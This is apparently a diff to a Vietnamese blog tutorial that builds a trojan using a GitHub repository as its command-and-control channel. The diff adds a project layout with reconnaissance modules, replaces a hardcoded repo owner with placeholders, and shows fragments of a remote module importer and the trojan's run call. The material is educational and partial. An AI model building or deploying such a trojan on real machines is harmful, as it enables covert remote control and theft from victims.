@@ -31,6 +31,20 @@ Trojan không tự nhân bản như virus hay sâu máy tính (worm), mà thư�
 
 ---
 # Code Trojan with Github
+
+>Bash
+{% highlight bash %}
+bhptrojan
+├── config
+│   └── abc.json
+├── data
+├── git_trojan.py
+├── modules
+│   ├── dirlister.py
+│   └── enviroment.py
+└── my_token.txt
+{% endhighlight %}
+
 >Python
 {% highlight python lineos %}
 import base64
@@ -45,7 +59,7 @@ import time
 from datetime import datetime
 from github3.repos.contents import Contents
 
-def github_connect(token_path='token.txt', owner='ybvy', repo='bhptrojan') -> github3.repos.Repository:
+def github_connect(token_path='path_to_personal_access_token_file', owner='owner', repo='repo_name') -> github3.repos.Repository:
     """Connects to the GitHub repository."""
     with open(token_path) as f:
         token = f.read().strip()
@@ -149,6 +163,7 @@ if __name__ == "__main__":
     sys.meta_path.append(GitImporter(repo))
     Trojan('abc', repo).run()
 {% endhighlight %}
+
 
 
 <script src="https://giscus.app/client.js"
